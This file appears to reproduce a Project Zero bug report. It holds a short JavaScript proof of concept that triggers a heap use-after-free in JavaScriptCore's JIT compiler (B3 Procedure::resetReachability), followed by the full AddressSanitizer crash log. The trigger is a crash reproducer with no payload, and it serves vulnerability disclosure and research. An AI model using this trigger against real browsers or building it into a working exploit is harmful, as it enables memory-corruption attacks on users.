@@ -1,0 +1,135 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1101
+
+Note: It seems it doesn't crash the JSC compiled without Address Sanitizer.
+
+PoC:
+-->
+
+(function () {
+    for (var i = 0; i < 1000000; ++i) {
+        const v = Array & 1 ? v : 1;
+        typeof o <= 'object';
+    }
+}());
+
+<!--
+Asan Log:
+=================================================================
+==32191==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000099738 at pc 0x000106c7af16 bp 0x700006a57850 sp 0x700006a57848
+READ of size 8 at 0x607000099738 thread T20
+==32191==AddressSanitizer: while reporting a bug found another one. Ignoring.
+    #0 0x106c7af15 in JSC::B3::Procedure::resetReachability() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x4c7f15)
+    #1 0x106a1be8c in JSC::B3::generateToAir(JSC::B3::Procedure&, unsigned int) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x268e8c)
+    #2 0x106a1bd2f in JSC::B3::prepareForGeneration(JSC::B3::Procedure&, unsigned int) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x268d2f)
+    #3 0x107424312 in JSC::FTL::compile(JSC::FTL::State&, JSC::DFG::Safepoint::Result&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc71312)
+    #4 0x107232f3b in JSC::DFG::Plan::compileInThreadImpl(JSC::DFG::LongLivedState&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7ff3b)
+    #5 0x10722f7e2 in JSC::DFG::Plan::compileInThread(JSC::DFG::LongLivedState&, JSC::DFG::ThreadData*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7c7e2)
+    #6 0x1073e1b87 in JSC::DFG::Worklist::ThreadBody::work() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc2eb87)
+    #7 0x10802330b in WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase> const&)::$_0::operator()() const (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x187030b)
+    #8 0x1080974bd in WTF::threadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e44bd)
+    #9 0x108097b9d in WTF::wtfThreadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e4b9d)
+    #10 0x7fffeb99baaa in _pthread_body (/usr/lib/system/libsystem_pthread.dylib+0x3aaa)
+    #11 0x7fffeb99b9f6 in _pthread_start (/usr/lib/system/libsystem_pthread.dylib+0x39f6)
+    #12 0x7fffeb99b1fc in thread_start (/usr/lib/system/libsystem_pthread.dylib+0x31fc)
+
+0x607000099738 is located 72 bytes inside of 80-byte region [0x6070000996f0,0x607000099740)
+freed by thread T20 here:
+    #0 0x1031d4cf4 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x4bcf4)
+    #1 0x1080b073f in bmalloc::Deallocator::deallocateSlowCase(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18fd73f)
+    #2 0x106c7d70d in JSC::B3::Procedure::deleteOrphans() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x4ca70d)
+    #3 0x107439a98 in JSC::FTL::(anonymous namespace)::LowerDFGToB3::lower() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc86a98)
+    #4 0x10743889a in JSC::FTL::lowerDFGToB3(JSC::FTL::State&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc8589a)
+    #5 0x107232ee5 in JSC::DFG::Plan::compileInThreadImpl(JSC::DFG::LongLivedState&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7fee5)
+    #6 0x10722f7e2 in JSC::DFG::Plan::compileInThread(JSC::DFG::LongLivedState&, JSC::DFG::ThreadData*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7c7e2)
+    #7 0x1073e1b87 in JSC::DFG::Worklist::ThreadBody::work() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc2eb87)
+    #8 0x10802330b in WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase> const&)::$_0::operator()() const (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x187030b)
+    #9 0x1080974bd in WTF::threadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e44bd)
+    #10 0x108097b9d in WTF::wtfThreadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e4b9d)
+    #11 0x7fffeb99baaa in _pthread_body (/usr/lib/system/libsystem_pthread.dylib+0x3aaa)
+    #12 0x7fffeb99b9f6 in _pthread_start (/usr/lib/system/libsystem_pthread.dylib+0x39f6)
+    #13 0x7fffeb99b1fc in thread_start (/usr/lib/system/libsystem_pthread.dylib+0x31fc)
+
+previously allocated by thread T20 here:
+    #0 0x1031d4790 in __sanitizer_mz_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x4b790)
+    #1 0x7fffeb9062d9 in malloc_zone_malloc (/usr/lib/system/libsystem_malloc.dylib+0x22d9)
+    #2 0x1080ba154 in bmalloc::DebugHeap::malloc(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1907154)
+    #3 0x1080af4fb in bmalloc::Allocator::allocateSlowCase(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18fc4fb)
+    #4 0x108046e95 in bmalloc::Allocator::allocate(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1893e95)
+    #5 0x108046178 in WTF::fastMalloc(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1893178)
+    #6 0x106a13b32 in JSC::B3::Value* JSC::B3::Procedure::add<JSC::B3::Value, JSC::B3::Opcode, JSC::B3::Type, JSC::B3::Origin>(JSC::B3::Opcode, JSC::B3::Type, JSC::B3::Origin) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x260b32)
+    #7 0x10743aa02 in JSC::FTL::(anonymous namespace)::LowerDFGToB3::createPhiVariables() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc87a02)
+    #8 0x107438f1d in JSC::FTL::(anonymous namespace)::LowerDFGToB3::lower() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc85f1d)
+    #9 0x10743889a in JSC::FTL::lowerDFGToB3(JSC::FTL::State&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc8589a)
+    #10 0x107232ee5 in JSC::DFG::Plan::compileInThreadImpl(JSC::DFG::LongLivedState&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7fee5)
+    #11 0x10722f7e2 in JSC::DFG::Plan::compileInThread(JSC::DFG::LongLivedState&, JSC::DFG::ThreadData*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa7c7e2)
+    #12 0x1073e1b87 in JSC::DFG::Worklist::ThreadBody::work() (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc2eb87)
+    #13 0x10802330b in WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase> const&)::$_0::operator()() const (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x187030b)
+    #14 0x1080974bd in WTF::threadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e44bd)
+    #15 0x108097b9d in WTF::wtfThreadEntryPoint(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e4b9d)
+    #16 0x7fffeb99baaa in _pthread_body (/usr/lib/system/libsystem_pthread.dylib+0x3aaa)
+    #17 0x7fffeb99b9f6 in _pthread_start (/usr/lib/system/libsystem_pthread.dylib+0x39f6)
+    #18 0x7fffeb99b1fc in thread_start (/usr/lib/system/libsystem_pthread.dylib+0x31fc)
+
+Thread T20 created by T0 here:
+    #0 0x1031ca379 in wrap_pthread_create (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x41379)
+    #1 0x108097acb in WTF::createThreadInternal(void (*)(void*), void*, char const*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e4acb)
+    #2 0x108097325 in WTF::createThread(char const*, std::__1::function<void ()>) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18e4325)
+    #3 0x1080217fb in WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase> const&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x186e7fb)
+    #4 0x1073dc5c8 in JSC::DFG::Worklist::enqueue(WTF::PassRefPtr<JSC::DFG::Plan>) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xc295c8)
+    #5 0x1070919e1 in JSC::DFG::compileImpl(JSC::VM&, JSC::CodeBlock*, JSC::CodeBlock*, JSC::DFG::CompilationMode, unsigned int, JSC::Operands<JSC::JSValue> const&, WTF::PassRefPtr<JSC::DeferredCompilationCallback>) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x8de9e1)
+    #6 0x1070913c8 in JSC::DFG::compile(JSC::VM&, JSC::CodeBlock*, JSC::CodeBlock*, JSC::DFG::CompilationMode, unsigned int, JSC::Operands<JSC::JSValue> const&, WTF::PassRefPtr<JSC::DeferredCompilationCallback>) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x8de3c8)
+    #7 0x1071e8a07 in JSC::DFG::tierUpCommon(JSC::ExecState*, unsigned int, unsigned int) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa35a07)
+    #8 0x1071e9589 in triggerOSREntryNow (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xa36589)
+    #9 0x449e46e022e0  (<unknown module>)
+    #10 0x107a904fc in llint_entry (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12dd4fc)
+    #11 0x107a89aca in vmEntryToJavaScript (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12d6aca)
+    #12 0x10773d60d in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xf8a60d)
+    #13 0x1076c60dd in JSC::Interpreter::execute(JSC::ProgramExecutable*, JSC::ExecState*, JSC::JSObject*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0xf130dd)
+    #14 0x106ea73a6 in JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x6f43a6)
+    #15 0x106ea75ae in JSC::profiledEvaluate(JSC::ExecState*, JSC::ProfilingReason, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x6f45ae)
+    #16 0x10c86d8c3 in WebCore::JSMainThreadExecState::profiledEvaluate(JSC::ExecState*, JSC::ProfilingReason, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x25348c3)
+    #17 0x10c86d434 in WebCore::ScriptController::evaluateInWorld(WebCore::ScriptSourceCode const&, WebCore::DOMWrapperWorld&, WebCore::ExceptionDetails*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2534434)
+    #18 0x10c881081 in WebCore::ScriptElement::executeClassicScript(WebCore::ScriptSourceCode const&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2548081)
+    #19 0x10c87e0c2 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x25450c2)
+    #20 0x10b01bb60 in WebCore::HTMLScriptRunner::runScript(WebCore::ScriptElement&, WTF::TextPosition const&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xce2b60)
+    #21 0x10b01b8a5 in WebCore::HTMLScriptRunner::execute(WTF::Ref<WebCore::ScriptElement>&&, WTF::TextPosition const&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xce28a5)
+    #22 0x10af4576e in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xc0c76e)
+    #23 0x10af45e52 in WebCore::HTMLDocumentParser::pumpTokenizerLoop(WebCore::HTMLDocumentParser::SynchronousMode, bool, WebCore::PumpSession&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xc0ce52)
+
+SUMMARY: AddressSanitizer: heap-use-after-free (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x4c7f15) in JSC::B3::Procedure::resetReachability()
+Shadow bytes around the buggy address:
+  0x1c0e00013290: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00
+  0x1c0e000132a0: 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fc 00
+  0x1c0e000132b0: fa fa fa fa 00 00 00 00 00 00 00 00 fc 00 fa fa
+  0x1c0e000132c0: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa
+  0x1c0e000132d0: 00 00 00 00 00 00 00 00 fc 00 fa fa fa fa fd fd
+=>0x1c0e000132e0: fd fd fd fd fd fd fd[fd]fa fa fa fa 00 00 00 00
+  0x1c0e000132f0: 00 00 00 fc fc fa fa fa fa fa 00 00 00 00 00 00
+  0x1c0e00013300: 00 fc fc fa fa fa fa fa 00 00 00 00 00 00 00 fc
+  0x1c0e00013310: fc fa fa fa fa fa 00 00 00 00 00 00 00 fc fc fa
+  0x1c0e00013320: fa fa fa fa 00 00 00 00 00 00 00 fc fc fa fa fa
+  0x1c0e00013330: fa fa 00 00 00 00 00 00 00 fc fc fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==32191==ABORTING
+-->
